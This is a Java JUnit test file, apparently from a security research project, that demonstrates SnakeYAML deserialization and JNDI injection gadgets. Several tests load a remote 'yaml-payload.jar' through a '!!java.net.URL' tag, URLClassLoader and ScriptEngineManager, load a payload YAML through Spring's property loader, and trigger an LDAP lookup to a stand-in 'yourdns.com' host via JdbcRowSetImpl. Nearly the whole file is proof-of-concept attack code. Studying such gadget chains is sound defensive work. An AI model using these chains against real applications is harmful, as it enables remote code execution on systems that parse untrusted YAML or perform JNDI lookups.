package com.b1ngz.sec;

import com.sun.rowset.JdbcRowSetImpl;
import org.junit.Test;
import org.springframework.boot.env.YamlPropertySourceLoader;
import org.springframework.core.io.ClassPathResource;
import org.yaml.snakeyaml.Yaml;

import javax.script.ScriptEngineManager;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.UUID;

public class SnakeYAMLTest {

    @Test
    public void testYaml() {
        Yaml yaml = new Yaml();
        Object url = yaml.load("!!java.net.URL [\"http://127.0.0.1:63712/yaml-payload.jar\"]");
        System.out.println(url.getClass());
        System.out.println(url);
    }

    @Test
    public void testURLClassLoader() throws Exception {
        URL url = new URL("http://127.0.0.1:63712/yaml-payload.jar");
        new URLClassLoader(new URL[]{url});
    }

    @Test
    public void testScriptEngineManager() throws Exception {
        URL url = new URL("http://127.0.0.1:63712/yaml-payload.jar");
        new ScriptEngineManager(new URLClassLoader(new URL[]{url}));
    }

    @Test
    public void test() throws Exception {
        new YamlPropertySourceLoader().load("name", new ClassPathResource("/payload/yaml-payload.yml"), "");
    }

    @Test
    public void testJdbcRowSetImpl() throws Exception {
        String dns = UUID.randomUUID().toString().replace("-", "") + ".yourdns.com";
        String dataSourceName = String.format("ldap://%s", dns);
        System.out.println(dataSourceName);
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName(dataSourceName);
        // this will result in a call to connect() => InitialContext->lookup()
        jdbcRowSet.setAutoCommit(true);
    }
}
